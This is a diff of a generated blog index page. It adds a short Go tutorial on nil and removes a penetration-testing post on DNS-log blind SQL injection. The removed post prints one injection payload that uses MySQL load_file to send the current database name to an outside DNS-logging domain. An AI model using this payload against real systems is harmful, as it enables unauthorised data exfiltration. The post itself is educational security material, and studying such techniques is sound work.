@@ -158,6 +158,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2019/01/03/goNil/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/01/03/goNil/" class="post-title-link" itemprop="url">nil in the Go language</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-01-03 22:59:12" itemprop="dateCreated datePublished" datetime="2019-01-03T22:59:12-05:00">2019-01-03</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-17 11:38:41" itemprop="dateModified" datetime="2023-10-17T11:38:41-04:00">2023-10-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/nil/" itemprop="url" rel="index"><span itemprop="name">nil</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>In the Go language, “<strong><em>nil</em></strong>“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “<strong><em>nil</em></strong>“:</p>
+<ol>
+<li><strong><em>Pointer and Reference Types</em></strong>: The most common use of “<strong><em>nil</em></strong>“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “<strong><em>nil</em></strong>“ is used in the following cases:</li>
+</ol>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ptr *<span class="type">int</span>    <span class="comment">// Declare an integer pointer, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> slice []<span class="type">int</span> <span class="comment">// Declare an integer slice, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> <span class="comment">// Declare a map, its zero value is nil</span></span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><strong><em>Interface Types</em></strong>: “<strong><em>nil</em></strong>“ can also be used with interface types, signifying that an interface has no specific implemented value. This can be useful in some cases to check if an interface is empty (uninitialized or unassigned).</li>
+</ol>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myInterface <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> myInterface == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The interface is empty&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li><strong><em>Function and Method Return Values</em></strong>: Functions and methods can return multiple values, some of which might be pointer types. In certain situations, returned pointers may be “<strong><em>nil</em></strong>,” indicating that there are no valid return values.</li>
+</ol>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findValue</span><span class="params">(slice []<span class="type">int</span>, target <span class="type">int</span>)</span></span> (*<span class="type">int</span>, <span class="type">bool</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> i, val := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> val == target &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;slice[i], <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>It’s important to handle “<strong><em>nil</em></strong>“ with care to avoid runtime errors like null pointer references. It’s a good practice to check whether pointers, slices, maps, and other data structures are “<strong><em>nil</em></strong>“ before accessing them to ensure safety.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2018/12/30/goPanicAndRecover/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1049,101 +1142,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/11/18/SQLInjectionDnsLog/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/11/18/SQLInjectionDnsLog/" class="post-title-link" itemprop="url">DNS Log Blind SQL Injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-11-18 10:47:59" itemprop="dateCreated datePublished" datetime="2016-11-18T10:47:59-05:00">2016-11-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-19 10:53:51" itemprop="dateModified" datetime="2023-10-19T10:53:51-04:00">2023-10-19</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">DNS Log Blind SQL Injection</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Sometimes, when injecting, you may not get direct feedback, or you may not be able to use time-based blind injection. In such cases, you can use out-of-band channels, which means using other protocols or channels, such as HTTP requests, DNS resolution, SMB services, to exfiltrate data. <strong><em>DNS log</em></strong> blind injection can reduce the number of requests sent and achieve injection with direct feedback.</p>
-<p><strong><em>DNS log</em></strong>: It stores domain name information on the DNS server, recording user access information for domains like <a target="_blank" rel="noopener" href="http://www.xxx.com/">www.xxx.com</a>.</p>
-<p><strong><em>Conditions for utilization</em></strong>:</p>
-<ol>
-<li><code>secure_file_priv</code> in mysql.ini must be empty.</li>
-<li>If <code>secure_file_priv</code> is null, importing and exporting are not allowed.</li>
-<li>If <code>secure_file_priv</code> is set to &#x2F;tmp, importing and exporting can only be done in the &#x2F;tmp directory.</li>
-<li>When <code>secure_file_priv</code> is empty, there are no restrictions, and importing and exporting are allowed.</li>
-</ol>
-<p><strong><em>Example</em></strong>:</p>
-<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and load_file(concat(&#x27;\\&#x27;, (select database()), &#x27;.27epx0.ceye.io\abc&#x27;))--+&quot;</span><br></pre></td></tr></table></figure>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1215,13 +1213,13 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">66</span>
+        <span class="site-state-item-count">68</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
